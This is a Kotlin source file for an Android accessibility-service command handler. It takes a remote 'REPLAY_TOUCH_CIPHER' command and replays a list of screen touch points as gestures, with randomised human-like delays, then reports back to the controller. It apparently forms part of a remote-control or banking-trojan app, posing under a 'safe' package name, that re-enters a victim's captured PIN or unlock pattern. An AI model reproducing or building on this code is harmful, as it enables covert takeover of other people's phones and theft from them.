package com.storm.safe.rock.service.modules.command

import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.util.Log
import org.json.JSONObject

class CipherReplayCommandHandler : CommandHandler {
    companion object {
        private const val TAG = "CipherReplayCmd"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "REPLAY_TOUCH_CIPHER"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val service = context.service ?: return
        if (Build.VERSION.SDK_INT < 24) {
            context.sendEvent("cipher_replay_error", JSONObject().apply {
                put("error", "API 24+ required")
            })
            return
        }

        val touchPoints = params?.optJSONArray("touch_points") ?: run {
            context.sendEvent("cipher_replay_error", JSONObject().apply {
                put("error", "missing touch_points")
            })
            return
        }

        val delayMin = params.optLong("delay_min", 50L)
        val delayMax = params.optLong("delay_max", 150L)
        val mode = params.optString("mode", "local")

        Log.i(TAG, "Replaying ${touchPoints.length()} touch points, mode=$mode")

        for (i in 0 until touchPoints.length()) {
            val pt = touchPoints.optJSONObject(i) ?: continue
            val x = pt.optDouble("x", 0.0).toFloat()
            val y = pt.optDouble("y", 0.0).toFloat()
            val duration = pt.optLong("duration", 100L)

            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(50)))
                .build()
            service.dispatchGesture(gesture, null, null)

            val delay = delayMin + (Math.random() * (delayMax - delayMin)).toLong()
            kotlinx.coroutines.delay(delay)
        }

        context.sendEvent("cipher_replay_complete", JSONObject().apply {
            put("count", touchPoints.length())
            put("mode", mode)
        })
    }
}
